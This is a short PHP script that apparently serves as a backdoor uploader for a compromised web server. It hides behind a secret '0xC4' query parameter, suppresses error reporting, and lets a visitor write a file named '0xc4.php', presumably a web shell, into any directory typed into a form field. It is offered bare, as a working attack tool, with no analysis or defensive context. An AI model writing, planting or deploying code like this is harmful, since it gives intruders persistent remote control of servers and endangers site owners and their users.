<?php
error_reporting(0);
if (!$_GET["0xC4"] == "upload") {
    die();
}
if ($_POST["submit"] == "submit") {
    if ($_FILES["file"]["name"] == "0xc4.php") {
        $uploaddir = $_POST["dir"];
        $uploadfile = $uploaddir . basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $uploadfile)) {
            echo "File was successfully uploaded.</span><hr />";
        } else {
            echo "Upload failed!</span><hr/>";
        }
    } else {
        echo "Sorry, only C4 can be using this uploader!";
    }
}
?>
<h1>0xC4</h1>
<form enctype="multipart/form-data" method="post"><input type="text" name="dir" value="./" /> (upload directory)<br><input type="file" name="file" /><input type="submit" name="submit" value="submit" />
</form>